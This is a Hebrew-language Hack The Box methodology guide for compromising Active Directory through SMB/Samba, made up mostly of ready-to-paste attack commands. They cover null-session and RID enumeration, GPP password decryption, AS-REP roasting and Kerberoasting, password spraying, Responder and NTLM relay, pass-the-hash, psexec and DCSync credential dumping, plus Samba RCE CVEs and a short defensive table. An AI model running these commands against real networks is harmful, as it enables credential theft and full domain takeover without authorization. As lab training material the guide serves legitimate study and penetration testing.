<div dir="rtl">

# HTB Active Directory — ווקטור Samba / SMB (עברית)

> מדריך מתודולוגי לתקיפת **Active Directory** במעבדות **Hack The Box** דרך משטח
> ה-**SMB** — הפרוטוקול ש-Samba מממש בלינוקס וש-Domain Controllers חושפים
> בפורטים **139/445**.
>
> גרסה עברית של [`HTB-AD-Samba-Vector.md`](./HTB-AD-Samba-Vector.md). כל הפקודות
> נשארות באנגלית כדי שאפשר יהיה להעתיק־להדביק.

> [!IMPORTANT]
> **לשימוש מורשה בלבד.** החומר מיועד ל-Hack The Box, פלטפורמות CTF אחרות,
> ומעבדות שאתה הבעלים שלהן או שקיבלת אישור מפורש לבדוק. סריקה ותקיפה של מערכות
> ללא הרשאה בכתב היא עבירה על החוק. הישאר בגבולות ה-scope.

---

## למה SMB/Samba הוא "דלת הכניסה" ל-AD

- **תמיד חשוף על DC** — `445/tcp` ו-`139/tcp` (NetBIOS). השיתופים SYSVOL ו-NETLOGON
  קריאים לכל משתמש מאומת בברירת מחדל.
- **משטח אנומרציה דולף** — לפי רמת ההקשחה אפשר לשלוף שם דומיין, משתמשים, קבוצות,
  מדיניות סיסמאות ושיתופים — **עוד לפני שיש בידינו סיסמה אחת**.
- **מכרה זהב של credentials** — SYSVOL מכיל GPP, סקריפטים של logon וקבצי קונפיגורציה
  שלעיתים קרובות מכילים סיסמאות (הקלאסי: `Groups.xml` במכונה `Active`).
- **ערוץ הרצה ותנועה** — עם credential או NTLM hash מקבלים `psexec`/`smbexec`/`wmiexec`,
  pass-the-hash ו-DCSync.

**Samba** הוא המימוש הפתוח של SMB/CIFS ב-Unix. במכונות לינוקס ב-HTB השירות שסורקים
*הוא* Samba (`smbd`), ומביא עמו היסטוריה של באגים (ראה §Samba CVEs). בנוסף,
הכלים `smbclient`/`rpcclient`/`net` שבצד התוקף מגיעים מחבילת Samba.

---

## הכלים

| כלי | תפקיד |
|-----|-------|
| **nmap** | גילוי פורטים/שירותים/סקריפטים |
| **NetExec (`nxc`)** | יורש CrackMapExec — אנומרציה ו-spraying ל-SMB/LDAP/WinRM |
| **enum4linux-ng** | אנומרציית null-session אוטומטית |
| **smbclient / smbmap** | גישה לשיתופים ומיפוי הרשאות |
| **rpcclient** | שאילתות MS-RPC (משתמשים/קבוצות/RID) |
| **Impacket** | `GetNPUsers`, `GetUserSPNs`, `secretsdump`, `psexec`, `ntlmrelayx` |
| **BloodHound** | מיפוי גרפי של נתיבי תקיפה |
| **kerbrute** | אנומרציית משתמשים ו-spraying ל-Kerberos |
| **Responder** | הרעלת LLMNR/NBT-NS ולכידת NetNTLM |
| **hashcat / john** | פיצוח hashes |

```bash
export IP=10.10.10.100
export DOMAIN=htb.local
export DC=dc01.htb.local
echo "$IP  $DC $DOMAIN" | sudo tee -a /etc/hosts
# Kerberos רגיש לזמן — סנכרן שעון מול ה-DC:
sudo ntpdate $IP
```

---

## המתודולוגיה — 6 שלבים

</div>

```
 גילוי → אנומרציית SMB לא-מאומתת → ציד שיתופים / GPP →
   → השגת credential (roast/spray/relay) → אנומרציה מאומתת + BloodHound →
     → תנועה רוחבית + DCSync → Domain Admin
```

<div dir="rtl">

### שלב 1 — גילוי

</div>

```bash
nmap -Pn -p- --min-rate 2000 -oA nmap/allports $IP
nmap -Pn -sC -sV -p 88,135,139,389,445,464,593,636,3268,3269,5985 \
     --script "smb-os-discovery,smb-security-mode,smb2-security-mode,smb-protocols" $IP
nxc smb $IP     # מדפיס OS, דומיין, ומצב SMB signing
```

<div dir="rtl">

מה לקרוא: `smb-os-discovery` → שם המחשב וה-FQDN של הדומיין; `smb-security-mode` →
האם **SMB signing** נדרש (אם לא — **relay** אפשרי); `smb-protocols` → האם SMBv1
פעיל (דגל למכונה ישנה/פגיעה).

### שלב 2 — אנומרציית SMB לא-מאומתת

</div>

```bash
# null / guest sessions
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares
# אנומרציה אוטומטית
enum4linux-ng -A $IP | tee enum4linux.txt
# RPC + RID cycling (שליפת משתמשים בלי credentials)
rpcclient -U "" -N $IP -c 'enumdomusers;enumdomgroups;querydominfo;getdompwinfo'
nxc smb $IP -u 'guest' -p '' --rid-brute 4000
```

<div dir="rtl">

כל שם חשבון נכנס ל-`users.txt` — הקובץ הזה מזין AS-REP roasting, spraying ו-kerbrute.
אם ה-DC מוקשח (`RestrictAnonymous`), עבור לאנומרציית משתמשים דרך Kerberos
(`kerbrute userenum`) שלא דורשת session של SMB.

### שלב 3 — ציד שיתופים ו-loot

</div>

```bash
smbmap -H $IP -u "$USER" -p "$PASS"
nxc smb $IP -u "$USER" -p "$PASS" --shares
smbclient //$IP/SYSVOL -U "$USER%$PASS"
```

<div dir="rtl">

**הקלאסיקה — סיסמאות GPP:** SYSVOL (או שיתוף `Replication`) מכיל `Groups.xml` עם
`cpassword` מוצפן ב-AES — ומיקרוסופט **פרסמה את המפתח**, כך שהפענוח טריוויאלי:

</div>

```bash
smbclient //$IP/Replication -N -c 'recurse ON; ls'
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_password -M spider_plus
```

<div dir="rtl">

אם יש הרשאת **כתיבה** לשיתוף שמשתמשים גולשים אליו — שתול קובץ SCF/LNK שמכריח את
ה-Explorer של הקורבן להזדהות מול ה-IP שלך (ללכידה/relay עם Responder).

### שלב 4 — מ-SMB ל-credentials

</div>

```bash
# אימות משתמשים ו-AS-REP roasting
kerbrute userenum -d $DOMAIN --dc $DC users.txt
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
# Kerberoasting (דורש credential כלשהו)
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request
hashcat -m 13100 kerb.txt rockyou.txt
# Password spraying (כבד את ה-lockout policy!)
nxc smb $IP -u users.txt -p 'Welcome2024!' --continue-on-success
# הרעלה + relay (אם signing לא נדרש)
sudo responder -I tun0 -wv
impacket-ntlmrelayx -t smb://$IP -smb2support -c 'whoami /all'
```

<div dir="rtl">

### שלב 5 — אנומרציה מאומתת + BloodHound

</div>

```bash
nxc smb $IP -u "$USER" -p "$PASS"                 # "Pwn3d!" = local admin
nxc smb $IP -u "$USER" -H "$NTHASH"               # pass-the-hash
nxc smb $IP -u "$USER" -p "$PASS" --sam --lsa     # דורש local admin
bloodhound-python -u "$USER" -p "$PASS" -d $DOMAIN -ns $IP -c All --zip
```

<div dir="rtl">

ב-BloodHound חפש: *Shortest Path to Domain Admins*, *Kerberoastable/AS-REP roastable
users*, *DCSync rights (GetChanges/GetChangesAll)*, וניצול ACL
(`GenericAll`/`WriteDACL`/`ForceChangePassword`).

### שלב 6 — תנועה רוחבית והסלמה

</div>

```bash
impacket-psexec  $DOMAIN/$USER:$PASS@$IP
impacket-wmiexec $DOMAIN/$USER@$IP -hashes :$NTHASH   # שקט יותר
# DCSync → Domain Admin (עם הרשאות replication)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
# pass-the-hash כ-Administrator
impacket-psexec Administrator@$IP -hashes :$ADMIN_NTHASH
```

<div dir="rtl">

---

## Samba CVEs שתפגוש ב-HTB

| CVE | שם | רלוונטיות |
|-----|----|-----------|
| **CVE-2007-2447** | `usermap_script` | המכונה **`Lame`** — הזרקת פקודה דרך שדה שם המשתמש → root. |
| **CVE-2017-7494** | **SambaCry** | העלאת ספריה משותפת לשיתוף כתיב + טעינה דרך named pipe → RCE. |
| **CVE-2021-44142** | `vfs_fruit` | כתיבת heap מחוץ לתחום → RCE (כאשר מודול תאימות macOS פעיל). |

```bash
smbclient -L //$IP -N                                  # זיהוי גרסת Samba
nmap -p139,445 --script smb-vuln-cve2007-2447 $IP
# Metasploit: exploit/multi/samba/usermap_script
```

---

## הצד הכחול (Blue-Team) — קצר

| טכניקה | זיהוי | מניעה |
|--------|-------|-------|
| null-session / RID cycling | binds אנונימיים ל-`samr`/`srvsvc` | `RestrictAnonymous`, כיבוי Guest |
| GPP cpassword | קריאת `Groups.xml` ב-SYSVOL | KB2962486, אל תאחסן סיסמאות ב-GPP |
| AS-REP roasting | Event 4768 בלי pre-auth | הסר "Do not require Kerberos preauth" |
| Kerberoasting | Event 4769 עם RC4 | gMSA, סיסמאות ארוכות, AES בלבד |
| LLMNR/relay | responders זרים, SMB auth חריג | כבה LLMNR/NBT-NS, **דרוש SMB signing** |
| DCSync | Event 4662 replication מחוץ ל-DC | Protected Users, הגבלת הרשאות replication |

---

## Cheat sheet מהיר

</div>

```bash
nxc smb $IP                                          # OS, domain, signing
nxc smb $IP -u '' -p '' --shares                     # null session
enum4linux-ng -A $IP
nxc smb $IP -u guest -p '' --rid-brute 4000          # שליפת משתמשים
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_password    # GPP
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request
bloodhound-python -u "$USER" -p "$PASS" -d $DOMAIN -ns $IP -c All --zip
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc # DCSync
```

<div dir="rtl">

---

## קישורים

- HTB Academy — *Active Directory Enumeration & Attacks*
- Impacket — https://github.com/fortra/impacket
- NetExec — https://github.com/Pennyw0rth/NetExec
- מדריך מלא (אנגלית) — [`HTB-AD-Samba-Vector.md`](./HTB-AD-Samba-Vector.md)
- רשימת מכונות — [`HTB-CTF-List.md`](./HTB-CTF-List.md)

> [!IMPORTANT]
> חומר לימודי למעבדות מורשות בלבד (Hack The Box / CTF).

</div>
